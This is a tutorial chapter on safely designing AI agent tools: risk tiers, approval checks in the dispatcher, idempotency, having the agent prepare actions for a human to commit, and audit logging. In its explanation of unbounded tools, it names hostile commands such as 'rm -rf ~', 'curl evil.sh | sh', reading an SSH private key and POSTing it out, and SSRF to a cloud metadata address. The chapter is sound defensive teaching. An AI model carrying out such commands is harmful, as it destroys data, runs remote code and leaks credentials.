# 07 · Information Tools vs Action Tools

The video draws this line and then moves on. It deserves much more, because it
is the line between "a chatbot that can look things up" and "a program that
changes the world on the strength of a probability distribution."

## 7.1 The distinction

| | Information tool | Action tool |
|---|---|---|
| Effect on the world | none | **permanent** |
| Safe to retry? | yes | only if idempotent |
| Safe to run in parallel? | yes | often not |
| Safe on a hallucinated call? | wasted money | **incident** |
| Needs human approval? | rarely | frequently |
| Needs audit log? | nice to have | mandatory |
| Reversible? | n/a | usually not |

**Information tools** from earlier chapters: `calculate`, `get_weather`,
`get_exchange_rate`, `read_file`, `list_files`, `search_docs`, `get_order`.
Worst case on a bad call: a wrong answer and a few cents.

**Action tools**: `send_email`, `create_user`, `issue_refund`, `write_file`,
`delete_record`, `book_ticket`, `deploy`, `charge_card`, `post_message`,
`merge_pr`. Worst case: you refunded ₹4,00,000 to the wrong customer and there is
no undo.

## 7.2 The category error that causes incidents

> "It's the same mechanism, so it's the same risk."

It is not. The *mechanism* is identical — a JSON blob and a Python call. The
*consequences* differ by orders of magnitude, and your engineering must differ
accordingly. Concretely:

**A hallucinated read is noise. A hallucinated write is damage.** Models call the
wrong tool sometimes. At a 1% error rate, a read tool called 1000×/day produces
10 wasted lookups. An `issue_refund` tool called 1000×/day produces 10 wrong
refunds — *per day*.

**Retry semantics invert.** Your resilience instinct says "retry on timeout".
With `send_email`, a timeout may mean the email *was* sent and the response was
lost. Retry and you send it twice. With `charge_card`, you charge twice.

**Parallel execution becomes dangerous.** Three simultaneous `get_weather` calls
are fine. Three simultaneous `update_inventory` calls race.

**The loop amplifies.** In chapter 6's oscillation failure mode, a read loop
wastes money. A write loop can send 40 emails.

## 7.3 A three-tier risk model

Don't use a binary. Use tiers, and encode the tier in the registry so it's
enforced by code rather than by remembering.

```python
from enum import Enum

class Risk(str, Enum):
    READ      = "read"       # no effect. auto-execute. parallel ok.
    WRITE     = "write"      # reversible effect. auto-execute, audit, confirm at scale.
    IRREVERSIBLE = "danger"  # money, external comms, deletion. ALWAYS approve.
```

| Tier | Examples | Policy |
|---|---|---|
| `READ` | `calculate`, `get_weather`, `read_file`, `search` | auto-run, parallel, retry freely, log lightly |
| `WRITE` | `write_file`, `create_draft`, `update_local_record` | auto-run, serialise, full audit log, idempotency key, undo path |
| `IRREVERSIBLE` | `send_email`, `issue_refund`, `delete_*`, `charge_*`, `deploy` | human approval or a hard policy check, never parallel, never auto-retry, immutable audit |

Extend the registry from chapter 4:

```python
@dataclass
class Tool:
    name: str
    description: str
    fn: typing.Callable
    risk: Risk = Risk.READ
    params: dict = field(default_factory=dict)
    required: list = field(default_factory=list)
    idempotent: bool = True
```

```python
def call(self, name, args, *, approver=None):
    tool = self._tools.get(name)
    if tool is None:
        return f"Error: unknown tool {name!r}.", True

    if tool.risk is Risk.IRREVERSIBLE:
        if approver is None:
            return ("Error: this tool requires human approval and no approver "
                    "is configured in this context."), True
        decision = approver(tool, args)          # blocking, or raises Pending
        if not decision.approved:
            return (f"The user declined this action. Reason: "
                    f"{decision.reason or 'not given'}. Do not retry; "
                    f"propose an alternative or ask a question."), True

    audit.record(tool=name, args=args, risk=tool.risk, actor="agent")
    ...
```

The key structural point: **the policy lives in the dispatcher, not in the
prompt.** A prompt rule like "always ask before sending email" is a *request* to
a probabilistic system. A check in `call()` is a *guarantee*. Never rely on the
prompt for anything you'd be fired for getting wrong.

## 7.4 Idempotency for action tools

The general solution to "did it actually happen?" is an idempotency key derived
from the *intent*, not from the call:

```python
import hashlib, json

def idempotency_key(run_id: str, tool: str, args: dict) -> str:
    payload = json.dumps({"run": run_id, "tool": tool, "args": args}, sort_keys=True)
    return hashlib.sha256(payload.encode()).hexdigest()[:32]


@registry.tool(
    description="Sends an email to one recipient. Requires user approval. "
                "Returns a message id on success.",
    risk=Risk.IRREVERSIBLE,
    to="Recipient email address.",
    subject="Subject line, under 80 characters.",
    body="Plain-text body.",
)
def send_email(to: str, subject: str, body: str, *, _ctx) -> dict:
    key = idempotency_key(_ctx.run_id, "send_email", {"to": to, "subject": subject})
    if prior := sent_log.get(key):
        return {"status": "already_sent", "message_id": prior, "note": "deduplicated"}
    message_id = mail_provider.send(to=to, subject=subject, body=body,
                                    idempotency_key=key)
    sent_log.put(key, message_id)
    return {"status": "sent", "message_id": message_id}
```

Note `{"status": "already_sent", "note": "deduplicated"}` goes back to the model
as an honest result. It then tells the user the truth instead of claiming a
second send. **Never lie to the model about what happened** — it will build its
next decision on your lie.

## 7.5 Prefer "prepare" over "perform"

The highest-leverage design move in agent safety: split every irreversible action
into a safe preparation step and a trivial commit step.

```python
# ❌ one dangerous tool
send_email(to, subject, body)

# ✅ a safe tool + a UI action
draft_email(to, subject, body) -> {"draft_id": "d_8812", "preview_url": "..."}
# the human clicks Send in your UI. The agent never has the capability at all.
```

Same pattern everywhere:

| Instead of | Give the agent | Human does |
|---|---|---|
| `send_email` | `create_draft` | clicks Send |
| `issue_refund` | `propose_refund` | approves in a queue |
| `deploy_to_prod` | `open_pull_request` | reviews and merges |
| `delete_records` | `mark_for_deletion` | confirms the batch |
| `charge_card` | `create_payment_intent` | confirms |
| `post_to_slack` | `draft_message` | posts |

You get ~95% of the value (the hard part was composing the thing) with ~5% of the
risk, and the human stays meaningfully in control rather than rubber-stamping.
Reach for full autonomy only where the blast radius is genuinely small.

## 7.6 The unbounded action tool — the real lesson of `run_command`

The video's key security moment: don't give the agent a generic
`execute_terminal_command(cmd: str)`.

It's worth being precise about *why*, because the reasoning generalises.

A tool's risk is set by its **maximal reachable effect**, not its intended use.
`run_command` is intended for `mkdir portfolio`. Its maximal effect is *anything
the process user can do*: `rm -rf ~`, `curl evil.sh | sh`, reading `~/.ssh/id_rsa`
and POSTing it somewhere. One hallucination, one prompt injection in a fetched
web page, and you have arbitrary code execution as yourself.

This family of tools is the same trap wearing different clothes:

| Tool | Maximal effect |
|---|---|
| `run_command(cmd)` | everything the OS user can do |
| `run_sql(query)` | `DROP TABLE`, full data exfiltration |
| `http_request(url, method, body)` | SSRF into your cloud metadata endpoint (`169.254.169.254`), calls to any internal service |
| `eval_python(code)` | everything, plus it can rewrite your agent |
| `write_file(path, content)` *unsandboxed* | overwrite `~/.bashrc`, `authorized_keys`, your source code |

The fix is always the same shape — **replace one general capability with several
specific ones**:

```python
# ❌ one tool, unbounded
run_command(cmd: str)

# ✅ four tools, each bounded, each validating its own arguments
create_directory(path: str)          # under workspace only
write_file(path: str, content: str)  # under workspace only
read_file(path: str)                 # under workspace only
list_files(path: str)                # under workspace only
```

Now `rm -rf` isn't forbidden — **it's unrepresentable**. There is no key in the
registry that deletes anything. This is the difference between a policy (can be
argued with) and a type system (cannot). Chapter 10 implements it properly.

Same move for the others: instead of `run_sql`, expose `get_order(order_id)` and
`list_orders(customer_id, status)` backed by parameterised queries. Instead of
`http_request`, expose `get_weather(city)` with the URL hardcoded.

## 7.7 The audit log

For any `WRITE` or `IRREVERSIBLE` call, write an immutable record **before**
execution:

```python
{
  "ts": "2026-09-15T10:32:11Z",
  "run_id": "a4f2c881",
  "turn": 7,
  "actor": "agent",
  "on_behalf_of": "user_1042",       # whose authority is being exercised?
  "tool": "issue_refund",
  "args": {"order_id": "ORD-9921", "amount_inr": 4999},
  "risk": "danger",
  "approved_by": "user_1042",
  "approval_ts": "2026-09-15T10:32:09Z",
  "idempotency_key": "9f2a...c1",
  "model": "claude-sonnet-4-5",
  "prompt_sha": "b19e...",           # which system prompt version decided this
  "outcome": "pending"               # updated to ok/failed after execution
}
```

`on_behalf_of` and `prompt_sha` are the two fields people forget and then
desperately need. The first answers *"whose money was this?"*; the second answers
*"which version of our instructions produced this behaviour?"* when you're
reconstructing an incident three weeks later.

➡️ Next: [08 · Agents vs Workflows](08-agents-vs-workflows.md)
